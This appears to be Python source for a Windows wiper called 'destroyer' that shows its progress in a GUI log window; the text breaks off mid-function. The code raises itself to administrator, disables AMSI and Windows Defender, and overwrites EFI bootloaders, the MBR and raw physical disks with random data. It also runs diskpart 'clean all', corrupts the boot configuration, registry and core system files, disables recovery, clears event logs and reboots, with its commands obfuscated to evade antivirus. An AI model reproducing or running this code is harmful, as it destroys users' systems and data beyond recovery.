import os
import base64
import time
import random
import subprocess
import ctypes
import sys
import zlib
import datetime
import tkinter as tk
from tkinter import scrolledtext
try:
    import win32file
    import win32con
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

# Log file
LOG_FILE = "destroyer_log.txt"

def log_message(window, log_area, message, success=True, operation="General"):
    """Writes logs to GUI and file with operation type and duration."""
    start_time = time.time()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    status = "Success" if success else "Error"
    console_message = f"[{timestamp}] [{operation}] {status}: {message}"
    file_message = f"[{timestamp}] [{operation}] {status}: {message} (Duration: {(time.time() - start_time)*1000:.2f} ms)"
    log_area.insert(tk.END, console_message + "\n")
    log_area.see(tk.END)
    window.update()
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(file_message + "\n")

# Run as administrator
def run_as_admin():
    """Runs the script with elevated privileges."""
    if not ctypes.windll.shell32.IsUserAnAdmin():
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit(0)

# Check admin privileges
def is_admin():
    """Checks for admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Enhanced obfuscation for strings
def obfuscate_string(data):
    """Obfuscates strings with base64, XOR, and double padding."""
    key = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(120))
    compressed = zlib.compress(data.encode())
    xored = bytes(a ^ b for a, b in zip(compressed, (key.encode() * (len(compressed) // len(key) + 1))[:len(compressed)]))
    fake_data1 = bytes(random.randint(0, 255) for _ in range(random.randint(100, 200)))
    fake_data2 = bytes(random.randint(0, 255) for _ in range(random.randint(100, 200)))
    padded = base64.b64encode(fake_data1 + xored + fake_data2).decode()
    return padded, key

def deobfuscate_string(enc_data, key):
    """Deobfuscates strings: Base64 -> XOR -> zlib."""
    try:
        decoded = base64.b64decode(enc_data)[random.randint(100, 200):-random.randint(100, 200)]
        xored = bytes(a ^ b for a, b in zip(decoded, (key.encode() * (len(decoded) // len(key) + 1))[:len(decoded)]))
        return zlib.decompress(xored).decode()
    except:
        return ""

# Fake digital signature metadata
def add_fake_signature(window, log_area):
    """Adds fake digital signature metadata to the script."""
    try:
        fake_sig = f"CN=FakeCorp{random.randint(1000, 9999)}, OU=Security, O=FakeInc, C=US"
        fake_sig_path = f"C:\\Windows\\Temp\\fake_sig_{random.randint(1000, 9999)}.cer"
        with open(fake_sig_path, 'w') as f:
            f.write(f"-----BEGIN CERTIFICATE-----\n{fake_sig}\n-----END CERTIFICATE-----")
        log_message(window, log_area, f"Fake signature metadata added: {fake_sig_path}", operation="AV Bypass")
    except (OSError, PermissionError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="AV Bypass")

# Enhanced AMSI and Defender bypass
def amsi_bypass(window, log_area):
    """Disables AMSI, Defender, and other AVs with enhanced techniques."""
    try:
        # Disable AMSI via dynamic API calls
        kernel32 = ctypes.WinDLL('kernel32')
        amsi_dll = kernel32.LoadLibraryW('amsi.dll')
        if amsi_dll:
            ctypes.c_uint.in_dll(amsi_dll, 'AmsiInitialize').value = 0
            log_message(window, log_area, "AMSI DLL disabled via dynamic API", operation="AV Bypass")
        mp_dll = kernel32.LoadLibraryW('MpOav.dll')
        if mp_dll:
            ctypes.c_uint.in_dll(mp_dll, 'MpManagerOpen').value = 0
            log_message(window, log_area, "Defender MpOav DLL disabled", operation="AV Bypass")
    except Exception as e:
        log_message(window, log_area, f"Error (DLL bypass): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="AV Bypass")

    # PowerShell-based bypass commands
    amsi_commands = [
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableArchiveScanning $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true",
        "Set-MpPreference -DisableBlockAtFirstSeen $true -DisablePrivacyMode $true",
        "Stop-Service -Name WinDefend -Force",
        "sc delete WinDefend",
        "& 'C:\\Program Files\\Windows Defender\\MpCmdRun.exe' -RemoveDefinitions -All"
    ]
    for cmd in amsi_commands:
        try:
            enc_cmd, enc_key = obfuscate_string(cmd)
            subprocess.run(['powershell', '-ep', 'bypass', '-c', deobfuscate_string(enc_cmd, enc_key)], capture_output=True, timeout=15)
            log_message(window, log_area, f"AV bypass executed: {cmd[:50]}...", operation="AV Bypass")
        except (subprocess.SubprocessError, ValueError) as e:
            log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="AV Bypass")

# Check EFI partition
def check_efi_partition(window, log_area):
    """Checks for EFI partition existence."""
    try:
        result = subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        if result.returncode == 0:
            subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
            return True
        else:
            log_message(window, log_area, "EFI partition not found, skipping EFI operations", success=False, operation="EFI Check")
            return False
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Check")
        return False

# Create fake bootloaders/EFI
def create_fake_bootloaders(window, log_area):
    """Creates fake bootloader/EFI files."""
    try:
        subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition mounted: X:", operation="EFI Bootloader")
        fake_bootloader = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576)])
        for path in [
            'X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi',
            'X:\\EFI\\Boot\\bootx64.efi',
            'X:\\EFI\\Boot\\grubx64.efi',
            'X:\\EFI\\Boot\\fake_boot.efi',
            'X:\\Recovery\\WindowsRE\\fake_reagentc.exe'
        ]:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, 'wb') as f:
                    f.write(fake_bootloader)
                log_message(window, log_area, f"Fake bootloader created: {path} (Size: {len(fake_bootloader)} bytes)", operation="EFI Bootloader")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Bootloader")
        subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition unmounted: X:", operation="EFI Bootloader")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Bootloader")

# Create fake EFI variables (NVRAM overflow)
def create_fake_efi_vars(window, log_area):
    """Fills EFI variable store with massive fake data."""
    try:
        subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition mounted for NVRAM overflow: X:", operation="NVRAM Overflow")
        for var_file in ['vars.dat', 'fakevar1.dat', 'fakevar2.dat', 'fakevar3.dat', 'fakevar4.dat', 'fakevar5.dat', 'fakevar6.dat', 'fakevar7.dat']:
            try:
                with open(f'X:\\EFI\\Variable\\{var_file}', 'wb') as f:
                    data = bytes(random.randint(0, 255) for _ in range(1048576 * 5))
                    f.write(data)
                log_message(window, log_area, f"NVRAM overflow file created: {var_file} (Size: {len(data)} bytes)", operation="NVRAM Overflow")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="NVRAM Overflow")
        subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition unmounted: X:", operation="NVRAM Overflow")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="NVRAM Overflow")

# Corrupt firmware variables
def corrupt_firmware_vars(window, log_area):
    """Corrupts UEFI variables and SPI flash data."""
    try:
        subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition mounted for firmware corruption: X:", operation="Firmware Corruption")
        for var_file in ['firmware_vars.dat', 'spi_flash.dat', 'uefi_store.dat']:
            try:
                with open(f'X:\\EFI\\Variable\\{var_file}', 'wb') as f:
                    data = bytes(random.randint(0, 255) for _ in range(1048576 * 5))
                    f.write(data)
                log_message(window, log_area, f"Firmware file corrupted: {var_file} (Size: {len(data)} bytes)", operation="Firmware Corruption")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Corruption")
        subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition unmounted: X:", operation="Firmware Corruption")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Corruption")

# Create fake firmware updates
def create_fake_firmware_updates(window, log_area):
    """Creates fake firmware, Intel ME, and SPI flash files."""
    try:
        for path in [
            'C:\\Windows\\System32\\Firmware\\fake_bios_update.bin',
            'C:\\Windows\\System32\\Firmware\\fake_spi_flash.bin',
            'C:\\ProgramData\\FirmwareUpdate\\fake_firmware.rom',
            'C:\\Windows\\System32\\nvram_corrupt.dat',
            'C:\\Windows\\System32\\Intel\\ME\\fake_me.bin'
        ]:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, 'wb') as f:
                    data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576 * 15)])
                    f.write(data)
                log_message(window, log_area, f"Fake firmware file created: {path} (Size: {len(data)} bytes)", operation="Fake Firmware")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Firmware")
        if check_efi_partition(window, log_area):
            subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
            log_message(window, log_area, "EFI partition mounted for fake firmware: X:", operation="Fake Firmware")
            for path in [
                'X:\\EFI\\Firmware\\fake_firmware_update.efi',
                'X:\\EFI\\Firmware\\fake_bios_update.bin',
                'X:\\EFI\\Firmware\\fake_spi_flash.bin'
            ]:
                try:
                    os.makedirs(os.path.dirname(path), exist_ok=True)
                    with open(path, 'wb') as f:
                        data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576 * 15)])
                        f.write(data)
                    log_message(window, log_area, f"Fake firmware file created: {path} (Size: {len(data)} bytes)", operation="Fake Firmware")
                except (OSError, PermissionError) as e:
                    log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Firmware")
            subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
            log_message(window, log_area, "EFI partition unmounted: X:", operation="Fake Firmware")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Firmware")

# Corrupt firmware registry
def corrupt_firmware_registry(window, log_area):
    """Corrupts firmware, BIOS, and NT registry keys."""
    try:
        for _ in range(5):
            fake_key = f"FakeFirmware{random.randint(1000, 9999)}"
            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidFirmware{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Fake firmware key added: HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources\\{fake_key}", operation="Firmware Registry Corruption")
            subprocess.run(['reg', 'add', 'HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS', '/v', fake_key, '/t', 'REG_SZ', '/d', f'CorruptedBIOS{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Fake BIOS key added: HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS\\{fake_key}", operation="Firmware Registry Corruption")
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', '/v', fake_key, '/t', 'REG_SZ', '/d', f'CorruptedVersion{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Fake NT key added: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\{fake_key}", operation="Firmware Registry Corruption")
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', fake_key, '/t', 'REG_SZ', '/d', f'C:\\Windows\\System32\\fake{random.randint(1000, 9999)}.exe', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Fake Run key added: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{fake_key}", operation="Firmware Registry Corruption")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Registry Corruption")

# Create fake COM/DCOM objects
def create_fake_com_objects(window, log_area):
    """Creates fake COM/DCOM objects."""
    try:
        for _ in range(5):
            fake_clsid = f"{{{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}}}"
            subprocess.run(['reg', 'add', f'HKLM\\SOFTWARE\\Classes\\CLSID\\{fake_clsid}', '/v', 'LocalServerName', '/t', 'REG_SZ', '/d', f'FakeCOM{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Fake COM object added: HKLM\\SOFTWARE\\Classes\\CLSID\\{fake_clsid}", operation="COM Corruption")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="COM Corruption")

# Create fake boot chain
def create_fake_boot_chain(window, log_area):
    """Creates fake BCD entries and chaotic boot chain."""
    try:
        for _ in range(10):
            fake_id = f'{{fakeboot{random.randint(1000, 9999)}}}'
            subprocess.run(['bcdedit', '/create', fake_id, '/d', f'FakeBoot{random.randint(1000, 9999)}', '/application', 'osloader'], capture_output=True, timeout=10)
            subprocess.run(['bcdedit', '/set', fake_id, 'path', '\\EFI\\Boot\\fake_boot.efi'], capture_output=True, timeout=10)
            subprocess.run(['bcdedit', '/set', '{bootmgr}', 'displayorder', fake_id], capture_output=True, timeout=10)
            log_message(window, log_area, f"Fake BCD entry created: {fake_id}", operation="BCD Corruption")
        subprocess.run(['bcdedit', '/set', '{bootmgr}', 'path', '\\fake_boot.efi'], capture_output=True, timeout=10)
        log_message(window, log_area, "Bootmgr path corrupted: \\fake_boot.efi", operation="BCD Corruption")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="BCD Corruption")

# Corrupt MBR (if no EFI)
def corrupt_mbr(window, log_area):
    """Corrupts MBR with random data."""
    if WIN32_AVAILABLE:
        try:
            handle = win32file.CreateFile(
                "\\\\.\\PhysicalDrive0",
                win32con.GENERIC_WRITE,
                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                None,
                win32con.OPEN_EXISTING,
                0,
                None
            )
            random_data = bytes(random.randint(0, 255) for _ in range(512))
            win32file.WriteFile(handle, random_data, None)
            win32file.CloseHandle(handle)
            log_message(window, log_area, "MBR corrupted: PhysicalDrive0 (Size: 512 bytes)", operation="MBR Corruption")
        except Exception as e:
            log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="MBR Corruption")
    try:
        with open('script.txt', 'w') as f:
            f.write('select disk 0\nclean\n')
        subprocess.run(['diskpart', '/s', 'script.txt'], capture_output=True, timeout=30)
        log_message(window, log_area, "MBR reset via diskpart", operation="MBR Corruption")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error (diskpart MBR): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="MBR Corruption")

# Corrupt disk data
def corrupt_disk_data(window, log_area):
    """Corrupts disk sectors and file system with random data."""
    if WIN32_AVAILABLE:
        for drive in ['\\\\.\\PhysicalDrive0', '\\\\.\\PhysicalDrive1', '\\\\.\\PhysicalDrive2', '\\\\.\\PhysicalDrive3', '\\\\.\\PhysicalDrive4', '\\\\.\\PhysicalDrive5', '\\\\.\\PhysicalDrive6', '\\\\.\\PhysicalDrive7']:
            try:
                handle = win32file.CreateFile(
                    drive,
                    win32con.GENERIC_WRITE,
                    win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                    None,
                    win32con.OPEN_EXISTING,
                    0,
                    None
                )
                for _ in range(30 if drive == '\\\\.\\PhysicalDrive0' else 15):
                    win32file.SetFilePointer(handle, random.randint(0, 100000) * 512, win32con.FILE_BEGIN)
                    random_data = bytes(random.randint(0, 255) for _ in range(512 * 3000))
                    win32file.WriteFile(handle, random_data, None)
                    log_message(window, log_area, f"Disk sector corrupted: {drive}, offset {random.randint(0, 100000) * 512} (Size: {len(random_data)} bytes)", operation="Disk Corruption")
                if drive == '\\\\.\\PhysicalDrive0':
                    win32file.SetFilePointer(handle, 0, win32con.FILE_BEGIN)
                    random_data = bytes(random.randint(0, 255) for _ in range(512 * 10000))
                    win32file.WriteFile(handle, random_data, None)
                    log_message(window, log_area, f"First 10000 sectors corrupted: {drive} (Size: {len(random_data)} bytes)", operation="Disk Corruption")
                win32file.CloseHandle(handle)
                break
            except Exception as e:
                log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Disk Corruption")
    try:
        random_file = f"C:\\corrupt_chunk_{random.randint(1000, 9999)}.dat"
        with open(random_file, 'wb') as f:
            data = bytes(random.randint(0, 255) for _ in range(1048576 * 15))
            f.write(data)
        log_message(window, log_area, f"Random file created: {random_file} (Size: {len(data)} bytes)", operation="Disk Corruption")
        subprocess.run(['fsutil', 'fsinfo', 'ntfsinfo', 'C:'], capture_output=True, timeout=10)
        log_message(window, log_area, "File system metadata retrieved: C:", operation="File System Corruption")
    except (OSError, PermissionError, subprocess.SubprocessError) as e:
        log_message(window, log_area, f"Error (file system): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="File System Corruption")

# Corrupt registry
def corrupt_registry(window, log_area):
    """Corrupts system registry keys."""
    try:
        for _ in range(10):
            fake_key = f"FakeKey{random.randint(1000, 9999)}"
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidData{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Fake registry key added: HKLM\\SOFTWARE\\Microsoft\\Windows\\{fake_key}", operation="Registry Corruption")
            subprocess.run(['reg', 'add', f'HKLM\\SYSTEM\\CurrentControlSet\\Services\\FakeService{random.randint(1000, 9999)}', '/v', 'ImagePath', '/t', 'REG_SZ', '/d', f'\\SystemRoot\\System32\\fake{random.randint(1000, 9999)}.sys', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Fake service added: FakeService{random.randint(1000, 9999)}", operation="Registry Corruption")
            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\Setup', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidSetup{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Fake registry key added: HKLM\\SYSTEM\\Setup\\{fake_key}", operation="Registry Corruption")
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidPolicy{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Fake registry key added: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\{fake_key}", operation="Registry Corruption")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Registry Corruption")

# Corrupt system files
def corrupt_system_files(window, log_area):
    """Corrupts critical system files."""
    for file_path in [
        'C:\\Windows\\System32\\winload.efi',
        'C:\\Windows\\System32\\bootmgr',
        'C:\\Windows\\System32\\config\\SYSTEM',
        'C:\\Windows\\System32\\config\\SOFTWARE',
        'C:\\Windows\\System32\\config\\RegBack\\SYSTEM',
        'C:\\Windows\\System32\\config\\RegBack\\SOFTWARE',
        'C:\\Windows\\System32\\ntoskrnl.exe',
        'C:\\Windows\\System32\\hal.dll',
        'C:\\Windows\\System32\\drivers\\ntfs.sys',
        'C:\\Windows\\System32\\winlogon.exe',
        'C:\\Windows\\System32\\smss.exe',
        'C:\\Windows\\System32\\drivers\\volmgr.sys'
    ]:
        try:
            if os.path.exists(file_path):
                subprocess.run(['takeown', '/f', file_path], capture_output=True, timeout=10)
                subprocess.run(['icacls', file_path, '/grant', 'Administrators:F'], capture_output=True, timeout=10)
                with open(file_path, 'r+b') as f:
                    data = bytes(random.randint(0, 255) for _ in range(1024))
                    f.write(data)
                log_message(window, log_area, f"System file corrupted: {file_path} (Size: {len(data)} bytes)", operation="System File Corruption")
            else:
                log_message(window, log_area, f"File not found, skipped: {file_path}", success=False, operation="System File Corruption")
        except (OSError, PermissionError, IOError, subprocess.SubprocessError) as e:
            log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="System File Corruption")

# Create fake driver
def create_fake_driver(window, log_area):
    """Creates fake driver files."""
    try:
        driver_path = f'C:\\Windows\\System32\\drivers\\fake_driver{random.randint(1000, 9999)}.sys'
        with open(driver_path, 'wb') as f:
            data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576)])
            f.write(data)
        log_message(window, log_area, f"Fake driver created: {driver_path} (Size: {len(data)} bytes)", operation="Fake Driver")
        subprocess.run(['reg', 'add', f'HKLM\\SYSTEM\\CurrentControlSet\\Services\\FakeDriver{random.randint(1000, 9999)}', '/v', 'ImagePath', '/t', 'REG_SZ', '/d', driver_path, '/f'], capture_output=True, timeout=10)
        log_message(window, log_area, f"Fake driver service added: FakeDriver{random.randint(1000, 9999)}", operation="Fake Driver")
    except (OSError, PermissionError, subprocess.SubprocessError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Driver")

# Create fake boot.ini and bootsect.bak
def create_fake_boot_files(window, log_area):
    """Creates fake boot.ini and bootsect.bak files."""
    try:
        boot_ini_path = 'C:\\boot.ini'
        with open(boot_ini_path, 'w') as f:
            data = f"[boot loader]\ntimeout=0\ndefault=multi(0)disk(0)rdisk(0)partition({random.randint(1, 10)})\\WINDOWS\n[operating systems]\nmulti(0)disk(0)rdisk(0)partition({random.randint(1, 10)})\\WINDOWS=\"Fake Windows {random.randint(1000, 9999)}\" /fastdetect"
            f.write(data)
        log_message(window, log_area, f"Fake boot.ini created: {boot_ini_path} (Size: {len(data.encode())} bytes)", operation="Fake Boot Files")
        bootsect_path = 'C:\\bootsect.bak'
        with open(bootsect_path, 'wb') as f:
            data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(512)])
            f.write(data)
        log_message(window, log_area, f"Fake bootsect.bak created: {bootsect_path} (Size: {len(data)} bytes)", operation="Fake Boot Files")
    except (OSError, PermissionError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Boot Files")

# Create fake Windows Update files
def create_fake_update_files(window, log_area):
    """Creates fake Windows Update files."""
    try:
        update_path = f'C:\\Windows\\SoftwareDistribution\\Download\\fake_update{random.randint(1000, 9999)}.dat'
        with open(update_path, 'wb') as f:
            data = bytes(random.randint(0, 255) for _ in range(1048576 * 15))
            f.write(data)
        log_message(window, log_area, f"Fake update file created: {update_path} (Size: {len(data)} bytes)", operation="Fake Update")
    except (OSError, PermissionError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Fake Update")

# Corrupt file system metadata
def corrupt_filesystem_metadata(window, log_area):
    """Corrupts file system metadata."""
    try:
        subprocess.run(['fsutil', 'fsinfo', 'ntfsinfo', 'C:'], capture_output=True, timeout=10)
        log_message(window, log_area, "File system metadata retrieved: C:", operation="File System Corruption")
        subprocess.run(['fsutil', 'file', 'createnew', f'C:\\fs_corrupt_{random.randint(1000, 9999)}.dat', str(1048576 * 5)], capture_output=True, timeout=10)
        log_message(window, log_area, f"Random file system file created: C:\\fs_corrupt_{random.randint(1000, 9999)}.dat (Size: 5 MB)", operation="File System Corruption")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="File System Corruption")

# System reboot
def system_reboot(window, log_area):
    """Reboots the system."""
    try:
        subprocess.run(['shutdown', '/r', '/t', '0'], capture_output=True, timeout=10)
        log_message(window, log_area, "System is rebooting!", operation="Reboot")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Error (reboot): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Reboot")

# Enhanced dynamic command mutation
def mutate_command(cmd):
    """Mutates commands randomly with higher mutation rate."""
    mutations = {
        'del': 'erase',
        'format': 'format /y',
        'bcdedit': 'bcdedit.exe',
        'reg delete': 'reg.exe delete',
        'reg add': 'reg.exe add',
        'wmic': 'wmic.exe',
        'schtasks': 'schtasks.exe',
        'sc': 'sc.exe',
        'net': 'net.exe',
        'copy': 'xcopy',
        'powershell': 'pwsh',
        'cmd': 'command'
    }
    for old, new in mutations.items():
        if random.random() > 0.90:  # Increased mutation rate
            cmd = cmd.replace(old, new)
    return cmd if ' ' in cmd and len(cmd) > 5 else ""

# Polymorphic commands
commands = {}
for cmd in [
    'del /f /q X:\\EFI\\*\\*.*',
    'format X: /fs:fat32 /q /y',
    'format X: /fs:ntfs /q /y',
    'bcdedit /store \\Boot\\BCD /delete {all} /f',
    'reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute /f',
    'reagentc /disable',
    'bcdedit /delete {bootmgr} /f',
    'bcdedit /set {globalsettings} safeboot minimal',
    'bcdedit /set {default} recoveryenabled no',
    'bcdedit /set {bootmgr} timeout 0',
    'wevtutil cl System',
    'reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot /f',
    'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot /v FakeSecureBoot /t REG_SZ /d Invalid /f',
    'echo . | diskpart /s script.txt & echo select disk 0 > script.txt & echo clean all >> script.txt'
]:
    var = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(80))
    enc_cmd, enc_key = obfuscate_string(cmd)
    commands[var] = (enc_cmd, enc_key)

# Main destruction function
def start_destruction(window, log_area, status_label):
    """Initiates destructive operations."""
    status_label.config(text="Status: Destruction Started!")
    window.update()
    log_message(window, log_area, "Destruction started!", operation="Start")
    add_fake_signature(window, log_area)
    amsi_bypass(window, log_area)
    
    efi_exists = check_efi_partition(window, log_area)
    if efi_exists:
        status_label.config(text="Status: Creating Fake EFI Bootloaders...")
        window.update()
        create_fake_bootloaders(window, log_area)
        status_label.config(text="Status: Performing NVRAM Overflow...")
        window.update()
        create_fake_efi_vars(window, log_area)
        status_label.config(text="Status: Corrupting Firmware...")
        window.update()
        corrupt_firmware_vars(window, log_area)
    status_label.config(text="Status: Creating Fake Firmware Updates...")
    window.update()
    create_fake_firmware_updates(window, log_area)
    status_label.config(text="Status: Corrupting Firmware Registry...")
    window.update()
    corrupt_firmware_registry(window, log_area)
    status_label.config(text="Status: Corrupting COM Objects...")
    window.update()
    create_fake_com_objects(window, log_area)
    status_label.config(text="Status: Corrupting Boot Chain...")
    window.update()
    create_fake_boot_chain(window, log_area)
    status_label.config(text="Status: Corrupting Registry...")
    window.update()
    corrupt_registry(window, log_area)
    status_label.config(text="Status: Corrupting System Files...")
    window.update()
    corrupt_system_files(window, log_area)
    status_label.config(text="Status: Creating Fake Driver...")
    window.update()
    create_fake_driver(window, log_area)
    status_label.config(text="Status: Creating Fake Boot Files...")
    window.update()
    create_fake_boot_files(window, log_area)
    status_label.config(text="Status: Creating Fake Update Files...")
    window.update()
    create_fake_update_files(window, log_area)
    status_label.config(text="Status: Corrupting File System...")
    window.update()
    corrupt_filesystem_metadata(window, log_area)
    status_label.config(text="Status: Corrupting Disk Data...")
    window.update()
    corrupt_disk_data(window, log_area)
    if not efi_exists:
        status_label.config(text="Status: Corrupting MBR...")
        window.update()
        corrupt_mbr(window, log_area)
    
    cmd_list = list(commands.items())
    random.shuffle(cmd_list)
    for var, (enc_cmd, enc_key) in cmd_list:
        try:
            cmd = mutate_command(deobfuscate_string(enc_cmd, enc_key))
            if not cmd:
                continue
            status_label.config(text=f"Status: Executing Command: {cmd[:50]}...")
            window.update()
            if 'diskpart' in cmd:
                proc = subprocess.Popen(['diskpart'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='latin1')
                output, error = proc.communicate(input='select disk 0\nclean all\n', timeout=120)
                log_message(window, log_area, "Diskpart executed: clean all", operation="Diskpart")
                if error and "success" not in error.lower():
                    log_message(window, log_area, f"Error: {error} (WinError: {ctypes.get_last_error()})", success=False, operation="Diskpart")
            elif 'X:' in cmd and not efi_exists:
                log_message(window, log_area, f"Command skipped due to missing EFI partition: {cmd}", success=False, operation="Command Execution")
                continue
            elif 'reagentc' in cmd:
